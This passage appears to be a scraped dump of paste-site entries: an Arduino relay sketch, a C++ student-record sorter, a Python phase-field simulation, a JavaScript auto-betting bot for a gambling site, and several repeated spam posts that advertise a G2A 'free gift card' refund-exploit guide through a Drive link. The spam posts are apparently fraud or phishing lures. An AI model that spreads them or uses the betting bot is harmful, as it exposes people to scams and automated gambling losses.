const uint8_t Relaymodule_RelayModule_Signal_PIN_D19 = 19;
const uint8_t Relaymodule_RelayModule_Signal_PIN_D21 = 21;

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
/***** used to store raw data *****/
bool Relaymodule_RelayModule_Signal_PIN_D4_rawData  = 0;
bool Relaymodule_RelayModule_Signal_PIN_D13_rawData = 0;
bool Relaymodule_RelayModule_Signal_PIN_D14_rawData = 0;
bool Relaymodule_RelayModule_Signal_PIN_D15_rawData = 0;
bool Relaymodule_RelayModule_Signal_PIN_D16_rawData = 0;
bool Relaymodule_RelayModule_Signal_PIN_D17_rawData = 0;
bool Relaymodule_RelayModule_Signal_PIN_D18_rawData = 0;
bool Relaymodule_RelayModule_Signal_PIN_D19_rawData = 0;
bool Relaymodule_RelayModule_Signal_PIN_D21_rawData = 0;

/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
/***** used to store data after characteristic curve transformation *****/
float Relaymodule_RelayModule_Signal_PIN_D4_phyData  = 0.0;
float Relaymodule_RelayModule_Signal_PIN_D13_phyData = 0.0;
float Relaymodule_RelayModule_Signal_PIN_D14_phyData = 0.0;
float Relaymodule_RelayModule_Signal_PIN_D15_phyData = 0.0;
float Relaymodule_RelayModule_Signal_PIN_D16_phyData = 0.0;
float Relaymodule_RelayModule_Signal_PIN_D17_phyData = 0.0;
float Relaymodule_RelayModule_Signal_PIN_D18_phyData = 0.0;
float Relaymodule_RelayModule_Signal_PIN_D19_phyData = 0.0;
float Relaymodule_RelayModule_Signal_PIN_D21_phyData = 0.0;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
Relay relayD4(Relaymodule_RelayModule_Signal_PIN_D4, true);   // Initialize relay on pin 4, Normally Open
Relay relayD13(Relaymodule_RelayModule_Signal_PIN_D13, true); // Initialize relay on pin 13, Normally Open
Relay relayD14(Relaymodule_RelayModule_Signal_PIN_D14, true); // Initialize relay on pin 14, Normally Open
Relay relayD15(Relaymodule_RelayModule_Signal_PIN_D15, true); // Initialize relay on pin 15, Normally Open
Relay relayD16(Relaymodule_RelayModule_Signal_PIN_D16, true); // Initialize relay on pin 16, Normally Open
Relay relayD17(Relaymodule_RelayModule_Signal_PIN_D17, true); // Initialize relay on pin 17, Normally Open
Relay relayD18(Relaymodule_RelayModule_Signal_PIN_D18, true); // Initialize relay on pin 18, Normally Open
Relay relayD19(Relaymodule_RelayModule_Signal_PIN_D19, true); // Initialize relay on pin 19, Normally Open
Relay relayD21(Relaymodule_RelayModule_Signal_PIN_D21, true); // Initialize relay on pin 21, Normally Open

void setup(void)
{
  // put your setup code here, to run once:
  
  relayD4.begin();  // Initialize the relay on pin 4
  relayD13.begin(); // Initialize the relay on pin 13
  relayD14.begin(); // Initialize the relay on pin 14
  relayD15.begin(); // Initialize the relay on pin 15
  relayD16.begin(); // Initialize the relay on pin 16
  relayD17.begin(); // Initialize the relay on pin 17
  relayD18.begin(); // Initialize the relay on pin 18
  relayD19.begin(); // Initialize the relay on pin 19
  relayD21.begin(); // Initialize the relay on pin 21
}

void loop(void)
{
  // put your main code here, to run repeatedly:

  updateOutputs(); // Refresh output data
}

void updateOutputs()
{
  // Update the state of each relay based on the raw data
  if (Relaymodule_RelayModule_Signal_PIN_D4_rawData)
    relayD4.turnOn();
  else
    relayD4.turnOff();

  if (Relaymodule_RelayModule_Signal_PIN_D13_rawData)
    relayD13.turnOn();
  else
    relayD13.turnOff();

  if (Relaymodule_RelayModule_Signal_PIN_D14_rawData)
    relayD14.turnOn();
  else
    relayD14.turnOff();

  if (Relaymodule_RelayModule_Signal_PIN_D15_rawData)
    relayD15.turnOn();
  else
    relayD15.turnOff();

  if (Relaymodule_RelayModule_Signal_PIN_D16_rawData)
    relayD16.turnOn();
  else
    relayD16.turnOff();

  if (Relaymodule_RelayModule_Signal_PIN_D17_rawData)
    relayD17.turnOn();
  else
    relayD17.turnOff();

  if (Relaymodule_RelayModule_Signal_PIN_D18_rawData)
    relayD18.turnOn();
  else
    relayD18.turnOff();

  if (Relaymodule_RelayModule_Signal_PIN_D19_rawData)
    relayD19.turnOn();
  else
    relayD19.turnOff();

  if (Relaymodule_RelayModule_Signal_PIN_D21_rawData)
    relayD21.turnOn();
  else
    relayD21.turnOff();
}

/* END CODE */"
PeMmn2ZR,Untitled,35657,C++,Tuesday 28th of May 2024 04:46:35 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <fstream>

template<typename container>
void print(container cont) {
    for (const auto& a : cont) {
        std::cout << a;
    }
    std::cout << std::endl;
}

struct student {
    std::string name;
    std::string surname;
    int course; // от 1 до 5
    int rating; // до 100
    double average_score; // до 5
};


std::ostream& operator<<(std::ostream& output, const student& st) {
    output << st.name << "" "" << st.surname << "" "" << st.course << "" "" << st.rating << "" "" << st.average_score << std::endl;
    return output;
}

std::istream& operator>>(std::istream& input, student& st) {
    input >> st.name >> st.surname >> st.course >> st.rating >> st.average_score;
    return input;
}

int main() {

    setlocale(LC_ALL, ""ru"");

    //std::vector<student> students{ {""Иван"", ""Иванов"", 1, 33, 3.7}, {""Владимир"", ""Михайлов"", 3, 39, 3.9}, {""Геннадий"", ""Петров"", 2, 56, 4.2}, {""Ольга"", ""Григорьева"", 5, 48, 4.0}, {""Елена"", ""Гришина"", 4, 75, 4.9} };


    std::ifstream fin(""students.txt"");

    std::ofstream fout(""temp.txt"");

    if (!fin.is_open() || !fout.is_open()) {
        std::cout << ""Ошибка открытия файла"";
    }
    else {

        std::vector<student> students;

        student temp;

        while (!fin.eof()) {
            fin >> temp;
            students.push_back(temp);
        }

        print(students);

        std::sort(students.begin(), students.end(), [](const student& left, const student& right) { return left.surname < right.surname; });

        print(students);

        std::sort(students.begin(), students.end(), [](const student& left, const student& right) { return left.rating > right.rating; });

        print(students);

        std::sort(students.begin(), students.end(), [](const student& left, const student& right) { return left.average_score > right.average_score; });

        print(students);

        for (auto a : students) {
            fout << a;
        }

        fin.close();
        fout.close();

        std::remove(""students.txt"");
        std::rename(""temp.txt"", ""students.txt"");
    }

    
}
"
aEdKwrtq,snowbot,coinwalk,JavaScript,Tuesday 28th of May 2024 04:41:51 AM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((elderly/640).toFixed(8));
var beast = prefit;
var crust = (prefit/2);
var tens = (prefit*8);
var sevens = (prefit*4.9);
var eights = (prefit*5.9);
var fives = (prefit*2.9);
var fours = (prefit*3.9);
var throttle = (prefit*12);
var winnerdinner = 144000;
var snowy = ((Math.floor(elderly/tens))*tens);
var james = ((Math.floor(elderly/tens))*tens);
var snowie = ((Math.floor(elderly/tens))*tens);
var great = 0;
var downer = 2.9;
var greatie = document.getElementById('pct_balance').value;
 
 function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
 
async function go(){
if (greatie!=great){
great = document.getElementById('pct_balance').value;
if (great>(snowie+(beast*4.9))){
    beast = beast*2;
    downer = 4.9;
    snowie = parseFloat(great);
}
if (great<(snowie-(beast*downer))){
    beast = beast*2;
    downer = 4.9;
    snowie = parseFloat(great);
}
if (great<=(snowy-throttle)){
    beast = prefit;
    downer = 2.9;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
}
if (great>snowy){
    snowy = ((Math.floor(great/tens))*tens);
    }
if ((beast>fours)&&(great>=snowy)){
    beast = prefit;
    downer = 2.9;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
}
if (great>=(james+tens)){
    beast = prefit;
    downer = 2.9;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
    james = ((Math.floor(great/tens))*tens);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
}
await sleep(800);
greatie = document.getElementById('pct_balance').value;
go();
}
 
go();"
f5HA5Uqp,💰G2A.com Free Gift Card Guide 2024 May💰,lookos13,Python,Tuesday 28th of May 2024 04:33:05 AM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1x81p1KKCkmh5SSkfIEdkJrUs8fx8xJli/view?usp=g2a_refund_exploit_2068187.pdf

Working as of:

29 May 2024"
3cS7wY3T,💰G2A.com Free Gift Card Guide 2024 May💰,pestinha,Python,Tuesday 28th of May 2024 04:26:19 AM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Apple gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1x81p1KKCkmh5SSkfIEdkJrUs8fx8xJli/view?usp=g2a_refund_exploit_2068187.pdf

Working as of:

29 May 2024"
XQdvN3eu,邀您一起看：⚙ 轻合集设置 ⚙,xiaomianao666,JavaScript,Tuesday 28th of May 2024 04:22:50 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥⚙ 轻合集设置 ⚙@@
1nERfmYk,💰G2A.com Free Gift Card Guide 2024 May💰,buch,Python,Tuesday 28th of May 2024 04:09:19 AM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1x81p1KKCkmh5SSkfIEdkJrUs8fx8xJli/view?usp=g2a_refund_exploit_1688286.pdf

Working as of:

29 May 2024"
ux4J61ne,💰G2A.com Free Gift Card Guide 2024 May💰,Alfonso1119,Python,Tuesday 28th of May 2024 04:02:35 AM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1x81p1KKCkmh5SSkfIEdkJrUs8fx8xJli/view?usp=g2a_refund_exploit_1688286.pdf

Working as of:

29 May 2024"
pF4ej2Mj,🎉G2A.com Free Gift Card Guide 2024 May🤑,atakan1983,Python,Tuesday 28th of May 2024 03:48:48 AM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Apple gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1x81p1KKCkmh5SSkfIEdkJrUs8fx8xJli/view?usp=g2a_refund_exploit_1688286.pdf

Working as of:

29 May 2024"
g27GGsy0,Мірошниченко_Артем_ПМ-11_Лр№8_Мет_комп_експ,mirosh111000,Python,Tuesday 28th of May 2024 03:41:27 AM CDT,"import numpy as np
import matplotlib.pyplot as plt
from IPython.display import Latex
import random
 
def my_time_(s):
    h = s // 3600
    time = s % 3600
    m = time // 60
    s = time % 60
    if h < 10:
        h = '0' + str(int(h))
    if m < 10:
        m = '0' + str(int(m))
    if s < 10:
        s = '0' + str(int(s))
    
    return fr'{h}:{m}:{s}'
        
def to_latex(text=''): return fr'${text}$'

def d2f_dc2(c, a):
    return 2 * (-a * c + 1)**2 - 8 * c * (-a * c + 1) * a + 2 * c**2 * a**2

def f(c, a):
    return c**2 * (1 - a*c)**2

def stability_index(k, c, a, z):
    return -M * k**2 * d2f_dc2(c, a) * (c - M*z*k**4)



M = 1
a = 1
z = 0.5
c0 = 0.5

k_values = np.linspace(0, 1.2, 100)
lambda_values = []

for k in k_values:
    lambda_val = stability_index(k, c0, a, z)
    lambda_values.append(lambda_val)

plt.figure(figsize=(9, 5))
plt.plot(k_values, lambda_values)
plt.xlabel(to_latex('k'))
plt.ylabel(to_latex('λ'))
plt.title(to_latex('Залежність\ λ(k)'))
plt.grid(True)
plt.show()









M = 1
z = 0.5
k_values = np.linspace(0, 1.2, 200)

a_values = np.linspace(0.1, 2, 200)
c0_values = np.linspace(0.1, 1, 200)

stability_results = np.zeros((len(a_values), len(c0_values)))

def d2f_dc2(c, a):
    return 2 * (-a * c + 1)**2 - 8 * c * (-a * c + 1) * a + 2 * c**2 * a**2

def stability_index(k, c, a, z):
    return -M * k**2 * d2f_dc2(c, a) - M * z * k**4

for i, a in enumerate(a_values):
    for j, c0 in enumerate(c0_values):
        lambda_values = []
        for k in k_values:
            lambda_val = stability_index(k, c0, a, z)
            if lambda_val > 0:
                lambda_values.append(lambda_val)
            else:
                lambda_values.append(np.nan)
        stability_results[i, j] = np.nanmean(lambda_values)

plt.figure(figsize=(9, 5))
plt.imshow(stability_results, extent=[min(c0_values), max(c0_values), min(a_values), max(a_values)], origin='lower', aspect='auto', cmap='magma')
plt.colorbar(label=to_latex('λ'))
plt.xlabel(to_latex('c_0'))
plt.ylabel(to_latex('a'))
plt.title(to_latex('Діаграма\ стійкості\ a(c_0)'))
plt.show()









def micro_ch_pre(Nx, Ny, co, iflag):
    np.random.seed(0)
    noise = 0.02
    con = np.zeros((Nx, Ny))
    if iflag == 1:
        for i in range(Nx):
            for j in range(Ny):
                con[i, j] = co + noise * (0.5 - random.random())
    else:
        for i in range(Nx):
            for j in range(Ny):
                ii = (i - 1) * Nx + j
                con[ii] = co + noise * (0.5 - random.random())
    return con

# Parameters
Nx = 64
Ny = 64
dx = 1.0
dy = 1.0
nstep = 10000
nprint = 50
dtime = 1.0e-2
ttime = 0.0
co = 0.40
mobility = 1.0
grad_coef = 0.5

# Prepare microstructure
iflag = 1
con = micro_ch_pre(Nx, Ny, co, iflag)

lap_con = np.zeros((Nx, Ny))
lap_dummy = np.zeros((Nx, Ny))
dummy = np.zeros((Nx, Ny))

# Time and concentration arrays for plotting
time_vals = []
concentration_vals = []

con_images = []
step_list = []
# Evolve
for istep in range(1, nstep + 1):
    ttime += dtime
    for i in range(Nx):
        for j in range(Ny):
            jp = j + 1 if j + 1 < Ny else 0
            jm = j - 1 if j - 1 >= 0 else Ny - 1
            ip = i + 1 if i + 1 < Nx else 0
            im = i - 1 if i - 1 >= 0 else Nx - 1

            hne = con[ip, j]
            hnw = con[im, j]
            hns = con[i, jm]
            hnn = con[i, jp]
            hnc = con[i, j]

            lap_con_ij = (hnw + hne + hns + hnn - 4 * hnc) / (dx * dy)

            dfdcon = 2 * (con[i, j] * (1 - con[i, j])**2 - 2 * con[i, j]**2 * (1 - con[i, j]))
            dummy[i, j] = dfdcon - grad_coef * lap_con_ij

    for i in range(Nx):
        for j in range(Ny):
            jp = j + 1 if j + 1 < Ny else 0
            jm = j - 1 if j - 1 >= 0 else Ny - 1
            ip = i + 1 if i + 1 < Nx else 0
            im = i - 1 if i - 1 >= 0 else Nx - 1

            hne = dummy[ip, j]
            hnw = dummy[im, j]
            hns = dummy[i, jm]
            hnn = dummy[i, jp]
            hnc = dummy[i, j]

            lap_dummy[i, j] = (hnw + hne + hns + hnn - 4 * hnc) / (dx * dy)

            con[i, j] = con[i, j] + dtime * mobility * lap_dummy[i, j]

            if con[i, j] >= 0.9999:
                con[i, j] = 0.9999
            if con[i, j] < 0.00001:
                con[i, j] = 0.00001

    if istep % nprint == 0 or istep == 1:
        print(f""done step: {istep}"")
        time_vals.append(ttime)
        concentration_vals.append(con.copy())

        if istep in [1, 100, 1000, 2500, 5000, 10000]:
            con_images.append(np.copy(con))
            step_list.append(round(ttime, 4))


fig, axes = plt.subplots(2, 3, figsize=(15, 10))
axes = axes.ravel()

for i in range(len(con_images)):
    im = axes[i].imshow(con_images[i], cmap='coolwarm')
    axes[i].set_title(to_latex(f'Time: \ {step_list[i]}'))
    plt.colorbar(im, ax=axes[i])
    axes[i].axis('off')
                          
plt.tight_layout()
plt.show()









def micro_ch_pre(Nx, Ny, co, iflag):
    np.random.seed(0)
    noise = 0.02
    con = np.zeros((Nx, Ny))
    if iflag == 1:
        for i in range(Nx):
            for j in range(Ny):
                con[i, j] = co + noise * (0.5 - random.random())
    else:
        for i in range(Nx):
            for j in range(Ny):
                ii = (i - 1) * Nx + j
                con[ii] = co + noise * (0.5 - random.random())
    return con

# Parameters
Nx = 64
Ny = 64
dx = 1.0
dy = 1.0
nstep = 1000
nprint = 50
dtime = 1.0e-2
ttime = 0.0
co = 0.40
mobility = 1.0
grad_coef = 0.5

# Prepare microstructure
iflag = 1
con = micro_ch_pre(Nx, Ny, co, iflag)

lap_con = np.zeros((Nx, Ny))
lap_dummy = np.zeros((Nx, Ny))
dummy = np.zeros((Nx, Ny))

# Time and concentration arrays for plotting
time_vals = []
concentration_vals = []
diff_history = []

# Evolve
for istep in range(1, nstep + 1):
    ttime += dtime
    for i in range(Nx):
        for j in range(Ny):
            jp = j + 1 if j + 1 < Ny else 0
            jm = j - 1 if j - 1 >= 0 else Ny - 1
            ip = i + 1 if i + 1 < Nx else 0
            im = i - 1 if i - 1 >= 0 else Nx - 1

            hne = con[ip, j]
            hnw = con[im, j]
            hns = con[i, jm]
            hnn = con[i, jp]
            hnc = con[i, j]

            lap_con_ij = (hnw + hne + hns + hnn - 4 * hnc) / (dx * dy)

            dfdcon = 2 * (con[i, j] * (1 - con[i, j])**2 - 2 * con[i, j]**2 * (1 - con[i, j]))
            dummy[i, j] = dfdcon - grad_coef * lap_con_ij

    for i in range(Nx):
        for j in range(Ny):
            jp = j + 1 if j + 1 < Ny else 0
            jm = j - 1 if j - 1 >= 0 else Ny - 1
            ip = i + 1 if i + 1 < Nx else 0
            im = i - 1 if i - 1 >= 0 else Nx - 1

            hne = dummy[ip, j]
            hnw = dummy[im, j]
            hns = dummy[i, jm]
            hnn = dummy[i, jp]
            hnc = dummy[i, j]

            lap_dummy[i, j] = (hnw + hne + hns + hnn - 4 * hnc) / (dx * dy)

            con[i, j] = con[i, j] + dtime * mobility * lap_dummy[i, j]

            if con[i, j] >= 0.9999:
                con[i, j] = 0.9999
            if con[i, j] < 0.00001:
                con[i, j] = 0.00001

    if istep % nprint == 0 or istep == 1:
        print(f""done step: {istep}"")
        average_temp = np.mean(con)
        concentration_vals.append(average_temp)
        time_vals.append(ttime)
        diff = np.mean(con**2) - np.mean(con)**2
        diff_history.append(diff)

# Plot Average Concentration vs. Time
plt.figure(figsize=(9, 5))
plt.plot(time_vals, concentration_vals)
plt.xlim(0, 5)
plt.xlabel(to_latex(""Time""))
plt.ylabel(to_latex(""Average\ Concentration""))
plt.title(to_latex(""Average\ Concentration vs \ Time""))
plt.grid(True)
plt.show()

# Plot <c**2> - <c>**2 vs. Time
plt.figure(figsize=(9, 5))
plt.plot(time_vals, diff_history)
plt.xlabel(to_latex(""Time""))
plt.ylabel(to_latex(""<c^2> - <c>^2""))
plt.title(to_latex(""<c^2> - <c>^2 \ vs\ Time""))
plt.grid(True)
plt.show()










# Задані параметри
M = 1
z = 0.5
k_values = np.linspace(0, 1.2, 200)

# Генерація значень a та c0
a_values1 = np.array([0.4, 0.6, 0.8, 1.2, 1.4, 1.6, 0.5, 1.0, 1.5, 1.0, 1.0])
c0_values1 = np.array([0.2, 0.3, 0.4, 0.6, 0.7, 0.8, 0.5, 0.5, 0.5, 0.3, 0.7])


# Генерація значень a та c0
a_values = np.linspace(0.1, 2, 200)
c0_values = np.linspace(0.1, 1, 200)

# Створення масиву для результатів
stability_results = np.zeros((len(a_values), len(c0_values)))

# Визначення функції d2f_dc2
def d2f_dc2(c, a):
    return 2 * (-a * c + 1)**2 - 8 * c * (-a * c + 1) * a + 2 * c**2 * a**2

# Визначення функції f(c, a)
def f(c, a):
    return c**2 * (1 - a * c)**2

# Визначення показника стійкості lambda
def stability_index(k, c, a, z):
    return -M * k**2 * d2f_dc2(c, a) - M * z * k**4

# Побудова діаграми стійкості
for i, a in enumerate(a_values):
    for j, c0 in enumerate(c0_values):
        lambda_values = []
        for k in k_values:
            lambda_val = stability_index(k, c0, a, z)
            if lambda_val > 0:
                lambda_values.append(lambda_val)
            else:
                lambda_values.append(np.nan)
        stability_results[i, j] = np.nanmean(lambda_values)

# Побудова графіка
plt.figure(figsize=(9, 5))
plt.imshow(stability_results, extent=[min(c0_values), max(c0_values), min(a_values), max(a_values)], origin='lower', aspect='auto', cmap='magma')
plt.colorbar(label=to_latex('λ'))
plt.xlabel(to_latex('c_0'))
plt.scatter(c0_values1, a_values1, color='red')
plt.ylabel(to_latex('a'))
plt.title(to_latex('Діаграма\ стійкості\ a(c_0)'))
plt.show()









def micro_ch_pre(Nx, Ny, co, iflag):
    np.random.seed(0)
    noise = 0.02
    con = np.zeros((Nx, Ny))
    if iflag == 1:
        for i in range(Nx):
            for j in range(Ny):
                con[i, j] = co + noise * (0.5 - random.random())
    else:
        for i in range(Nx):
            for j in range(Ny):
                ii = (i - 1) * Nx + j
                con[ii] = co + noise * (0.5 - random.random())
    return con

# Parameters
Nx = 64
Ny = 64
dx = 1.0
dy = 1.0
nstep = 25000
nprint = 50
dtime = 1.0e-2
ttime = 0.0
mobility = 1.0
grad_coef = 0.5

# Values to iterate over
a_values = np.array([0.4, 0.6, 0.8, 1.2, 1.4, 1.6, 0.5, 1.0, 1.5, 1.0, 1.0])
co_values = np.array([0.2, 0.3, 0.4, 0.6, 0.7, 0.8, 0.5, 0.5, 0.5, 0.3, 0.7])

for a, co in zip(a_values, co_values):
    print(f""\n\nRunning for a = {a} and co = {co}\n\n"")
    ttime = 0
    con = micro_ch_pre(Nx, Ny, co, iflag=1)

    lap_con = np.zeros((Nx, Ny))
    lap_dummy = np.zeros((Nx, Ny))
    dummy = np.zeros((Nx, Ny))

    # Time and concentration arrays for plotting
    time_vals = []
    concentration_vals = []

    # Evolve
    for istep in range(1, nstep + 1):
        ttime += dtime
        for i in range(Nx):
            for j in range(Ny):
                jp = j + 1 if j + 1 < Ny else 0
                jm = j - 1 if j - 1 >= 0 else Ny - 1
                ip = i + 1 if i + 1 < Nx else 0
                im = i - 1 if i - 1 >= 0 else Nx - 1

                hne = con[ip, j]
                hnw = con[im, j]
                hns = con[i, jm]
                hnn = con[i, jp]
                hnc = con[i, j]

                lap_con_ij = (hnw + hne + hns + hnn - 4 * hnc) / (dx * dy)

                dfdcon =  2*con[i, j]*(-a*con[i, j]+1)**2-2*((con[i, j])**2)*(-a*con[i, j]+1)*a
                dummy[i, j] = dfdcon - grad_coef * lap_con_ij

        for i in range(Nx):
            for j in range(Ny):
                jp = j + 1 if j + 1 < Ny else 0
                jm = j - 1 if j - 1 >= 0 else Ny - 1
                ip = i + 1 if i + 1 < Nx else 0
                im = i - 1 if i - 1 >= 0 else Nx - 1

                hne = dummy[ip, j]
                hnw = dummy[im, j]
                hns = dummy[i, jm]
                hnn = dummy[i, jp]
                hnc = dummy[i, j]

                lap_dummy[i, j] = (hnw + hne + hns + hnn - 4 * hnc) / (dx * dy)

                con[i, j] = con[i, j] + dtime * mobility * lap_dummy[i, j]

                if con[i, j] >= 0.9999:
                    con[i, j] = 0.9999
                if con[i, j] < 0.00001:
                    con[i, j] = 0.00001

        if istep % nprint == 0 or istep == 1:
            if istep % 5000 == 0:
                print(f""done step: {istep}"")
            time_vals.append(ttime)
            concentration_vals.append(con.copy())
            
            if istep == nstep:
                plt.figure(figsize=(9, 5))
                plt.imshow(con, cmap='coolwarm')
                plt.colorbar()
                plt.title(to_latex(f""a={a},\ c_0={co},\ Time: {round(ttime, 4)}""))
                plt.show()
"
sKKbKav0,🤑G2A.com Free Gift Card Guide 2024 May💰,pestinha,Python,Tuesday 28th of May 2024 03:35:13 AM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1x81p1KKCkmh5SSkfIEdkJrUs8fx8xJli/view?usp=g2a_refund_exploit_1688286.pdf

Working as of:

29 May 2024"
